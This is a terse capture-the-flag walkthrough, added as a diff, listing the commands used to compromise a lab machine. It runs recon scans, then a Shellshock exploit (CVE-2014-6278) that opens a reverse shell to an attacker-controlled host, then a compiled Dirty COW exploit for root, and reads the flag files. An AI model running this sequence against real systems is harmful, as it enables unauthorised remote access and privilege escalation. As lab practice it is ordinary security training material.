@@ -1,0 +1,12 @@
+1 - nmap -A 10.10.180.23
+2 - gobuster dir -u http://10.10.180.23/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+3 - http://10.10.180.23/backup
+4 - nikto -h 10.10.180.23 (CVE-2014-6278)
+5 - searchsploit -m 34900
+6 - python2.7 34900.py payload=reverse rhost=10.10.180.23 lhost=10.8.94.51 lport=4444
+7 - cat /home/ryan/user.txt
+8 - searchsploit -m 40839
+9 - gcc 40839.c -o dirty -lcrypt
+10 - ./dirty
+11 - whoami
+12 - cat /root/root.txt
